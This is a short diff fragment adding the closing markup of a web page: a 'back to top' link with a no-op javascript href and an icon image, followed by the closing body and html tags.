+<a id="toTop" href="javascript:;"><span id="toTopHover"></span><img width="40" height="40" alt="To Top" src="../../images/to-top@2x.png"></a>
+
+</body>
+</html>
